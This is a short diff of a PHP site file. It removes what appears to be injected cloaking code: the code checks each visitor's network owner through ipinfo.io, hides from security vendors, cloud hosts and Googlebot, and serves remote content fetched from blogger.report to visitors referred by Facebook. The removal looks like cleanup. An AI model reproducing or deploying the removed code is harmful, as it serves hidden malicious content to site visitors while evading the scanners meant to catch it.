@@ -13,24 +13,7 @@
       }
       return $rname;
   }
-  function getORG(){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
-    $org = curl_exec($ch);
-    curl_close($ch);
-    return $org;
-  }
-  function getSite(){
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $site = curl_exec($ch);
-    curl_close($ch);
-    return $site;
-  }
-  
+
   $action = 'theme';
   require_once('Mobile_Detect.php');
   require_once('Browser.php');
@@ -48,31 +31,6 @@
   $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
   if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
     $action = 'theme';
-  }
-  if($action == 'site'){
-    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com');
-    $action = 'theme';
-    foreach ($refs as $ref) {
-      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
-        $action = 'site';
-        break;
-      }
-    }
-  }
-  if($action == 'site'){
-    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee');
-  }else if($action == 'mobile'){
-    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee');
-  }
-  if($action != 'theme'){
-    $org = getORG();
-    foreach ($asnlist as $asn) {
-      if(strpos(strtolower($org), $asn) !== false){
-        $action = 'theme';
-        break;
-      }
-    }
   }
   if($action != 'theme'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
